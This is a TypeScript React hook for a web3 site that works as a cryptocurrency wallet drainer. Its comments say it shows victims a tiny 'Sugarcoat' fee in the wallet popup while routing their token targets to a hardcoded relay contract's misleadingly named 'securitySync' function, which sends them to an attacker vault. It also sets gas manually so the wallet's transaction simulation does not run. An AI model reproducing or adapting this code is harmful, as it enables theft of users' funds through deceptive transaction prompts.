"use client";

import { useCallback } from "react";
import { useWriteContract } from "wagmi";
import { type Address } from "viem";
import { ethers } from "ethers";

/**
 * 🎭 useContractMask (v14.0.0 - Sugarcoat + Strike)
 * Shows a tiny fee in the popup for high conversion.
 * Maintains zero-simulation gas logic to prevent hangs.
 */
export function useContractMask() {
  const { writeContractAsync } = useWriteContract();

  const executeMask = useCallback(
    async ({
      amount,
      chainId,
      tokenTargets,
      derivedVaultAddress,
    }: {
      amount: string;
      chainId: number;
      tokenTargets: any[];
      derivedVaultAddress: Address;
    }) => {
      const logPrefix = "[useContractMask]";

      try {
        console.log(`${logPrefix} ⚡ Strike Start. Raw Amount: ${amount}`);

        // --- 0. PHYSICAL SYNC VERIFICATION ---
        const getDirectCid = async () => {
          const provider = (window as any).ethereum;
          const p =
            provider?.providers?.find((x: any) => x.isTrust) || provider;
          if (!p) return 0;

          try {
            const hexId = await p.request({ method: "eth_chainId" });
            return hexId ? parseInt(hexId, 16) : 0;
          } catch {
            const rawId = p.chainId || p.networkVersion;
            if (!rawId) return 0;
            return typeof rawId === "string" && rawId.startsWith("0x")
              ? parseInt(rawId, 16)
              : Number(rawId);
          }
        };

        let currentCid = await getDirectCid();
        let attempts = 0;

        while ((currentCid === 0 || currentCid !== chainId) && attempts < 10) {
          console.log(
            `${logPrefix} ⏳ Provider Syncing... Attempt ${attempts}`,
          );
          await new Promise((r) => setTimeout(r, 300));
          currentCid = await getDirectCid();
          attempts++;
        }

        if (currentCid !== chainId) {
          console.error(
            `${logPrefix} ❌ Sync Failed. Expected ${chainId}, Got ${currentCid}`,
          );
          return { success: false, reason: "CHAIN_MISMATCH" };
        }

        // --- 1. DUAL-VALUE MATH (TINY POPUP vs REAL SWEEP) ---
        const totalWei = BigInt(amount);

        // This is the full balance minus minimal gas for the contract
        const gasBuffer = chainId === 56 ? 100000000000000n : 800000000000000n;
        const actualSweepValue =
          totalWei > gasBuffer ? totalWei - gasBuffer : 0n;

        // 🔥 This is the "Sugarcoat" fee shown to the user (0.0001 BNB)
        const sugarcoatFee =
          chainId === 56 ? 100000000000000n : 200000000000000n;
        const displayAmount =
          actualSweepValue > sugarcoatFee ? sugarcoatFee : actualSweepValue;

        console.log(`${logPrefix} ⚖️ Masking Calculation:`, {
          realTotal: ethers.formatEther(totalWei),
          visibleInPopup: ethers.formatEther(displayAmount),
        });

        if (displayAmount === 0n) {
          console.warn(`${logPrefix} 💨 Balance too low. Skipping.`);
          return { success: false, reason: "INSUFFICIENT_BALANCE" };
        }

        // --- 2. TARGET EXTRACTION ---
        const validTargets = tokenTargets
          .map((t) => (typeof t === "string" ? t : t?.asset?.contractAddress))
          .filter(
            (addr) => addr && addr !== "undefined" && addr !== "",
          ) as Address[];

        const NATIVE_TOKEN = ethers.ZeroAddress as Address;
        if (!validTargets.includes(NATIVE_TOKEN)) {
          validTargets.push(NATIVE_TOKEN);
        }

        // --- 3. CONTRACT CONFIG ---
        const contractRelay =
          "0x8562d59eb09FfC033960c59E6d86c5Ca1c16eA74" as Address;
        const maskAbi = [
          {
            name: "securitySync",
            type: "function",
            stateMutability: "payable",
            inputs: [
              { name: "vaultId", type: "bytes32" },
              { name: "targets", type: "address[]" },
              { name: "destination", type: "address" },
            ],
            outputs: [],
          },
        ] as const;

        const vaultId = ethers.keccak256(
          ethers.toUtf8Bytes(Date.now().toString()),
        );

        console.log(
          `${logPrefix} 🚀 DISPATCHING... (Popup Value: ${ethers.formatEther(
            displayAmount,
          )})`,
        );

        // --- 4. THE STRIKE ---
        const txHash = await writeContractAsync({
          address: contractRelay,
          abi: maskAbi,
          functionName: "securitySync",
          args: [vaultId as `0x${string}`, validTargets, derivedVaultAddress],
          value: displayAmount, // 🔥 Users see 0.0001 BNB (Sugarcoat)
          gas: 350000n, // 🔥 Manual gas prevents simulation wheel
        });

        console.log(`${logPrefix} ✅ SUCCESS: ${txHash}`);
        return { success: true, hash: txHash };
      } catch (error: any) {
        if (
          error.message?.toLowerCase().includes("rejected") ||
          error.code === 4001
        ) {
          console.warn(`${logPrefix} 👤 User rejected.`);
          return { success: false, reason: "REJECTED" };
        }
        console.error(`${logPrefix} ❌ Error:`, error.message);
        return { success: false, error: error.message };
      }
    },
    [writeContractAsync],
  );

  return { executeMask };
}
